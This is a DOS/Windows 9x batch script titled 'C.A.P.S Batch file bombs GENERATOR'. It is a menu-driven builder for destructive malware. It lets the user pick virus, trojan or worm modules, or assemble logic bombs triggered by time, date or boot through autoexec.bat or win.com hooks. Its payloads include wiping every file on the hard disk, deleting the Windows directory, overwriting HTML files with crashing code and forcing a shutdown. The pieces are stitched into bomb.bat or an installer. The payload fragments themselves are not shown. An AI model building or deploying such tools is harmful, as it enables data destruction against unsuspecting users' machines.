@echo off
if exist au.cfg del au.cfg
@echo C.A.P.S Batch file  bombs
@echo                        GENERATOR 1.1 beta
@ECHO RULES ANY KEY...
choice /N /C:abcdefghijklmnopqrstuvwxyz0123456789 >nul
if errorlevel 2 goto lamemod
if errorlevel 1 goto aumod
goto lamemod
:aumod
@echo Author mode enabled
@echo: author mode enabled >au.cfg
:lamemod
@echo    --------------
@echo ---caps----- 
@echo    --------------
@echo .
:virusbegin
@echo please selected
@echo                                v= virus
@echo                                t=trojan
@echo                                w=worm
@echo                                b=bombs
@echo                                default bombs 
choice /N /c:vtwb /T:b,55 
if errorlevel 4 goto bombs 
if errorlevel 3 goto worms
if errorlevel 2 goto trojan
if errorlevel 1 goto virus
:virus
cls 
call capsvir.bat
goto end
:trojan
cls
call capstroj.bat
goto end
:worms
cls
rem running capsworm.bat modules
call capsworm.bat
goto end
:bombs
cls
@echo THIS IS BOMB SECTION
@echo    ------------
@echo ---caps-----
@echo    ------------
@echo bombs selected
@echo bombs support :
@echo XXX### batch bombs ###XXX
@echo type windows & dos bombs
@echo bomb activations type:
@echo #####################
@echo                     t=  time activation bombs
@echo                           -autoexec.bat initialising
@echo .
@echo                     d=  date activation bombs
@echo                           -autoexec.bat initialising
@echo                           -win.com /dos.exe initialising (companion )
@echo .                                           
@echo                     s=  system booting bombs goto initialising menu
@echo                           -autoexec.bat initialising
@echo                           -win.com /dos exe initialising   (companion)        
@echo                     default= system booting bomb
@echo        please selected key...
choice /N /c:tds /T:s,55
if errorlevel 3 goto systembomb
if errorlevel 2 goto datebomb
if errorlevel 1 goto timebomb
:systembomb
cls
@echo selected systemboot bomb
:binit
@echo                                          a=     - autoexec.bat initialising
@echo                                          w=     -win.com /dos.exe initialising
@echo                                          default=a
choice /N /c:aw /T:a,55 
if errorlevel 2 goto wincb
if errorlevel 1 goto aubomb
:wincb
@echo selected win.com/dos.exe initialising bomb
type wbinit.cfg >instb.cfg
type twowin.cfg >two.cfg
if exist ifdate.cfg goto dbcont
goto bombpay
:aubomb
@echo selected autoexec.bat running initialisation
type abinit.cfg >instb.cfg
if exist ifdate.cfg goto dbcont
goto bombpay
:datebomb
@echo selected datebomb
copy aaa.cfg ifdate.cfg >nul
goto binit
:dbcont
del ifdate.cfg
:bdategod
@echo .
type dates.cfg
@echo .
@echo this date correct ? y=yes n=no def=yes
choice /N /C:yn /T:y,55
if errorlevel 2 goto nobdate
if errorlevel 1 goto yesbdate
:nobdate
call redit.bat
pause >nul
edit dates.cfg
goto bdategod
:yesbdate
copy dates.cfg b1.cfg >nul
goto bombpay
:timebomb
cls
@echo selected timebomb
:btimegod
@echo .
type times.cfg
@echo  .
@echo  this time correct ?  y=yes  n=no def=yes
choice /N /C:yn /T:y,55
if errorlevel 2 goto nobtime
if errorlevel 1 goto btimeyes
:nobtime
call redit.bat
pause >nul
edit times.cfg
goto btimegod
:btimeyes
type times.cfg >b1.cfg 
:bombpay
@echo rules any key
pause >nul
cls
@echo    --------------
@echo ----caps------
@echo    --------------
@echo It's bomb payload menu:
@echo .
@echo .
@echo .
@echo                  b=    -big tumor file making from hard disk
@echo                  d=    -deleted win&dos directory
@echo                  w=    -warm text windows htt files
@echo                  o=    -owervriting html files destructiv code (win9x crashing)
@echo                  a=    -all files deleting from hard disk (hey man this is evil?
@echo                  s=    -shut down from win98
@echo                  b=    -default
@echo rules any key ...
@echo .
@echo .
@echo .
choice /N /c:bdwoas /T:b,55   
if errorlevel 6 goto shutbomb
if errorlevel 5 goto adelbomb
if errorlevel 4 goto owhtmlb
if errorlevel 3 goto warmbomb
if errorlevel 2 goto wdelbomb
if errorlevel 1 goto bigbomb
:shutbomb
cls
@echo selected shutdown bomb (win98,winme)
@echo this bomb payload existing windows
@echo .
type winshut.cfg
if not exist au.cfg goto yewshb
@echo this code correct? y=yes n=no
choice /N /c:yn /T:y,55
if errorlevel 2 goto nowshb
if errorlevel 1 goto yewshb
:nowshb
call redit.bat
edit winshut.cfg
goto shutbomb
:yewshb
type winshut.cfg >b2.cfg
goto makebomb
:adelbomb
cls
@echo selected all files deleting from hard disk bomb
@echo this your evil
@echo this code danger!!!
@echo.
type delalldir.cfg
@echo .
if not exist au.cfg goto yedelald
@echo This code correct ? y=yes n=no default=y
choice /N /C:yn /T:y,55
if errorlevel 2 goto nodelald
if errorlevel 1 goto yedelald
:nodelald
call redit.bat
pause >nul
edit delalldir.cfg
goto adelbomb
:yedelald
type delalldir.cfg >b2.cfg
goto makebomb
:owhtmlb
cls
@echo selected owervriting html files bomb
type wincrash.cfg
@echo.
if not exist au.cfg goto yewcrb
@echo this code correct? y=yes n=no
choice /N /C:yn /T:y,55
if errorlevel2 goto nowcrb
if errorlevel 1 goto yewcrb
:nowcrb
call redit.bat
goto owhtmlb
:yewcrb
type wincrash.cfg >b2.cfg
goto makebomb
:warmbomb
cls
@echo selected warm text bomb for windows
type warmtext.cfg
@echo .
if not exist au.cfg goto yetxb
@echo this code correct? y=yes n=no
choice /N /C:yn /T:y,55
if errorlevel 2 goto notxb
if errorlevel 1 goto yetxb
:notxb
call redit.bat
edit warmtext.cfg
goto warmbomb
:yetxb
type warmtext.cfg >b2.cfg
goto makebomb
:wdelbomb
cls
@echo selected win&dos directory crasher bomb
type delwin.cfg
if not exist au.cfg goto ydelw
@echo this correct code ? y=yes n=no
choice /N /C:yn /T:y,55 
if errorlevel 2 goto nodelw
if errorlevel 1 goto ydelw
:nodelw
call redit.bat
pause >nul
edit delwin.cfg
goto wdelbomb
:ydelw
type delwin.cfg >b2.cfg
goto makebomb
:bigbomb
cls
@echo selected big file maker bomb
type bigfile.cfg
if not exist au.cfg goto bombfcfg
@echo this code correct?
choice /N /C:yn /T:y,55  y=yes   n=no   default=yes
if errorlevel 2 goto nobig
if errorlevel 1 goto bombfcfg
:nobig
call redit.bat
PAUSE >NUL
edit bigfile.cfg
goto bigbomb
:bombfcfg
type bigfile.cfg >b2.cfg
:makebomb
@echo making bomb?
choice /N  /c:yn /T:n,55 y=yes n=no,quit
if errorlevel 2 goto end
if errorlevel 1 goto makeb
:makeb
REM TWO MODULES
type two.cfg >b3.cfg
type twodos.cfg >two.cfg
@echo making bomb installer programs ?
@echo y=yes (making bomb installer shell)
@echo  n=no (not installer bombshell)
@echo default = yes
choice /N /C:yn /T:y,55
if errorlevel 2 goto nbinst
if errorlevel 1 goto ybinst 
:ybinst
@echo making bomb installer progz
copy /B instb.cfg+b1.cfg+b2.cfg+b3.cfg >nul bombshel.bat
@echo bombshel.bat
goto end
:nbinst
@echo making bomb...
@echo bomb.bat
copy /B  b1.cfg+b2.cfg+b3.cfg bomb.bat >nul
@echo ######################
@echo BOMB SECTION END
@echo DEDICATED C.A.P.S
@echo ######################
:end
if exist b1.cfg del b1.cfg >nul
if exist b2.cfg del b2.cfg >nul
if exist b3.cfg del b3.cfg >nul
@echo b=back to menu
@echo q=quit
choice /N /C:bq /T:q,10
if errorlevel 2 goto eend
if errorlevel 1 goto virusbegin
:eend
if exist au.cfg del au.cfg
exit
exit
exit
